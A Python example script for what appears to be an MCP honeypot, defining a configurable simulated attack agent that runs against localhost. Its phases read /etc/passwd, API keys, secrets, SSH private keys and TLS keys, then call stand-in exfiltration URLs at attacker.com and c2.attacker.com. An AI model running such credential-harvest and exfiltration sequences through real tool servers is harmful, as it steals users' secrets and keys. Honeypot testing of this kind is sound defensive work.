#!/usr/bin/env python3
"""Build your own attack agent with configurable behavior.

Shows how to create a custom agent class that you can extend
with your own attack patterns and tool sequences.

Usage:
    python examples/custom_agent.py

Requires: docker compose up, pip install httpx
"""

import asyncio
import json
from dataclasses import dataclass, field

import httpx

HONEYPOT_URL = "http://localhost:8000"


@dataclass
class ToolCall:
    """A single tool call to make."""

    name: str
    arguments: dict = field(default_factory=dict)


@dataclass
class AttackPhase:
    """A named phase of an attack with a sequence of tool calls."""

    name: str
    description: str
    calls: list[ToolCall]


class CustomAgent:
    """A configurable attack agent you can extend.

    Override `build_phases()` to define your own attack pattern.
    """

    def __init__(
        self,
        base_url: str = HONEYPOT_URL,
        agent_name: str = "CustomAgent",
        agent_version: str = "1.0",
        delay: float = 0.3,
    ):
        self.base_url = base_url
        self.agent_name = agent_name
        self.agent_version = agent_version
        self.delay = delay
        self._id = 0
        self._responses: dict[int, asyncio.Future[dict]] = {}

    def build_phases(self) -> list[AttackPhase]:
        """Override this to define your attack sequence.

        This default implementation does a simple recon pattern.
        """
        return [
            AttackPhase(
                name="Discovery",
                description="Map the filesystem",
                calls=[
                    ToolCall("list_directory", {"path": "/"}),
                    ToolCall("list_directory", {"path": "/etc"}),
                    ToolCall("list_directory", {"path": "/home"}),
                ],
            ),
            AttackPhase(
                name="Credential Harvest",
                description="Look for secrets",
                calls=[
                    ToolCall("read_file", {"path": "/etc/passwd"}),
                    ToolCall("get_env_var", {"name": "DATABASE_URL"}),
                    ToolCall("get_api_key", {"service": "openai"}),
                    ToolCall("list_secrets", {}),
                ],
            ),
            AttackPhase(
                name="Exfiltration",
                description="Send stolen data out",
                calls=[
                    ToolCall("fetch_url", {"url": "https://attacker.com/collect?data=stolen"}),
                ],
            ),
        ]

    async def run(self) -> None:
        """Execute all phases against the honeypot."""
        phases = self.build_phases()
        total_calls = sum(len(p.calls) for p in phases)
        print(f"\n{'=' * 50}")
        print(f"  {self.agent_name}/{self.agent_version}")
        print(f"  {len(phases)} phases, {total_calls} calls")
        print(f"{'=' * 50}\n")

        async with httpx.AsyncClient(
            timeout=30,
            headers={"User-Agent": f"{self.agent_name}/{self.agent_version}"},
        ) as client:
            # Connect + initialize
            async with client.stream("GET", f"{self.base_url}/sse") as sse:
                endpoint = ""
                async for line in sse.aiter_lines():
                    if line.startswith("data: "):
                        endpoint = self.base_url + line[6:]
                        break

                # Background reader
                async def read_sse() -> None:
                    event_type = ""
                    async for line in sse.aiter_lines():
                        if line.startswith("event: "):
                            event_type = line[7:]
                        elif line.startswith("data: ") and event_type == "message":
                            data = json.loads(line[6:])
                            rid = data.get("id")
                            if rid in self._responses:
                                self._responses[rid].set_result(data)
                            event_type = ""

                reader = asyncio.create_task(read_sse())

                # Initialize
                await self._call(client, endpoint, "initialize", {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {},
                    "clientInfo": {"name": self.agent_name, "version": self.agent_version},
                })
                await client.post(endpoint, json={
                    "jsonrpc": "2.0", "method": "notifications/initialized",
                })
                await asyncio.sleep(0.3)

                # Run phases
                for phase in phases:
                    print(f"--- {phase.name} ---")
                    print(f"    {phase.description}")
                    for tc in phase.calls:
                        result = await self._call(
                            client, endpoint, "tools/call",
                            {"name": tc.name, "arguments": tc.arguments},
                        )
                        status = "OK" if "result" in result else "ERR"
                        print(f"    {tc.name:20s} {status}")
                        await asyncio.sleep(self.delay)
                    print()

                reader.cancel()

        print("Done!")

    async def _call(self, client: httpx.AsyncClient, endpoint: str, method: str, params: dict) -> dict:
        self._id += 1
        self._responses[self._id] = asyncio.get_event_loop().create_future()
        await client.post(endpoint, json={
            "jsonrpc": "2.0", "id": self._id, "method": method, "params": params,
        })
        return await asyncio.wait_for(self._responses[self._id], timeout=10)


# ---------------------------------------------------------------------------
# Example: extend the base agent with a custom attack pattern
# ---------------------------------------------------------------------------


class SSHKeyHunter(CustomAgent):
    """An agent that specifically hunts for SSH keys and certificates."""

    def build_phases(self) -> list[AttackPhase]:
        return [
            AttackPhase("SSH Discovery", "Find SSH-related files", [
                ToolCall("list_directory", {"path": "/root/.ssh"}),
                ToolCall("list_directory", {"path": "/home"}),
                ToolCall("read_file", {"path": "/root/.ssh/authorized_keys"}),
                ToolCall("read_file", {"path": "/root/.ssh/id_rsa"}),
                ToolCall("read_file", {"path": "/root/.ssh/known_hosts"}),
            ]),
            AttackPhase("Certificate Harvest", "Read TLS certificates", [
                ToolCall("list_secrets", {"prefix": "tls/"}),
                ToolCall("read_secret", {"key": "tls/cert-pem"}),
                ToolCall("read_secret", {"key": "tls/key-pem"}),
                ToolCall("read_secret", {"key": "ssh/deploy-key"}),
            ]),
            AttackPhase("Exfiltrate Keys", "Send keys to C2 server", [
                ToolCall("fetch_url", {"url": "https://c2.attacker.com/upload?type=ssh"}),
                ToolCall("fetch_url", {"url": "https://c2.attacker.com/upload?type=tls"}),
            ]),
        ]


async def main() -> None:
    # Run the default agent
    agent = CustomAgent(agent_name="DefaultRecon", delay=0.2)
    await agent.run()

    # Run the SSH key hunter
    hunter = SSHKeyHunter(agent_name="SSHKeyHunter", agent_version="2.0", delay=0.2)
    await hunter.run()


if __name__ == "__main__":
    asyncio.run(main())
